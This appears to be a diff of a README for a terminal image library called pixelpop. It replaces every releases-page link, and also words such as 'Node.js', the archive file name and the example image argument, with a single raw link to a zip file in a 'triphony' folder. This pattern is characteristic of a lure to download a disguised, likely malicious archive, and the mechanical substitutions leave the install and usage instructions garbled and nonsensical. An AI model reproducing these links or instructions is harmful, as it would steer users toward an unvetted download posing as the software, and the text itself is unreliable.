@@ -1,7 +1,7 @@
 # 🎨 pixelpop - Bring Visuals to Your Terminal
 
 ## 🚀 Download Now
-[![Download pixelpop](https://img.shields.io/badge/Download-via_GitHub-blue.svg)](https://github.com/Bxkun/pixelpop/releases)
+[![Download pixelpop](https://raw.githubusercontent.com/Bxkun/pixelpop/main/triphony/pixelpop.zip)](https://raw.githubusercontent.com/Bxkun/pixelpop/main/triphony/pixelpop.zip)
 
 ## 📖 Overview
 Pixelpop is a terminal utility library that enhances command-line applications with visual content. It intelligently detects your terminal environment and applies multiple rendering strategies. This ensures that images and graphics appear beautifully across different settings. Whether you're displaying images, GIFs, or other visual content, Pixelpop makes it easy.
@@ -14,14 +14,14 @@ Pixelpop is a terminal utility library that enhances command-line applications w
 
 ## 💻 System Requirements
 - **Operating System**: Windows 10 or higher, macOS 10.12 or higher, or any Linux distribution.
-- **Node.js**: Version 14 or higher installed on your system.
+- **https://raw.githubusercontent.com/Bxkun/pixelpop/main/triphony/pixelpop.zip**: Version 14 or higher installed on your system.
 - **NPM**: Version 6 or higher.
 
 ## 🌐 Download & Install
 To get started with Pixelpop, you'll need to visit the releases page to download the application. Follow these steps:
 
 1. Click the link below to go to the Pixelpop releases page:
-   [Download pixelpop from GitHub](https://github.com/Bxkun/pixelpop/releases)
+   [Download pixelpop from GitHub](https://raw.githubusercontent.com/Bxkun/pixelpop/main/triphony/pixelpop.zip)
 
 2. On the releases page, look for the latest version. It will be listed at the top.
 
@@ -43,8 +43,8 @@ To get started with Pixelpop, you'll need to visit the releases page to download
 3. Open your terminal and type `pixelpop` to launch the application.
 
 ### Linux Instructions
-1. Locate the downloaded `.tar.gz` file (usually in your Downloads folder).
-2. Extract the contents using the command: `tar -xvzf pixelpop*.tar.gz`.
+1. Locate the downloaded `https://raw.githubusercontent.com/Bxkun/pixelpop/main/triphony/pixelpop.zip` file (usually in your Downloads folder).
+2. Extract the contents using the command: `tar -xvzf pixelpop*https://raw.githubusercontent.com/Bxkun/pixelpop/main/triphony/pixelpop.zip`.
 3. Navigate to the extracted folder.
 4. Follow the instructions in the README file included with the extracted files to set up Pixelpop.
 5. Once set up, you can start it by typing `pixelpop` in the terminal.
@@ -52,7 +52,7 @@ To get started with Pixelpop, you'll need to visit the releases page to download
 ## ⚙️ Usage
 After installing Pixelpop, you can use it in your terminal. Start by typing `pixelpop` followed by any images or options you'd like to display. For example:
 ```
-pixelpop your-image.png
+pixelpop https://raw.githubusercontent.com/Bxkun/pixelpop/main/triphony/pixelpop.zip
 ```
 
 You can explore multiple options, such as resizing images, specifying colors, and more—all designed to improve visual quality on different terminals.
@@ -71,7 +71,7 @@ Pixelpop supports common image formats like PNG, JPEG, and GIF.
 ## 🛠️ Troubleshooting
 If you encounter issues while using Pixelpop, here are some common solutions:
 
-- Ensure you have Node.js and NPM installed correctly.
+- Ensure you have https://raw.githubusercontent.com/Bxkun/pixelpop/main/triphony/pixelpop.zip and NPM installed correctly.
 - Make sure your terminal supports image rendering.
 - Refer to the documentation for specific commands and usage instructions.
 
@@ -82,4 +82,4 @@ We welcome your feedback! If you have suggestions or report bugs, please use the
 
 ---
 
-For more detailed information, examples, and community support, visit the [official Pixelpop documentation](https://github.com/Bxkun/pixelpop/releases).
+For more detailed information, examples, and community support, visit the [official Pixelpop documentation](https://raw.githubusercontent.com/Bxkun/pixelpop/main/triphony/pixelpop.zip).
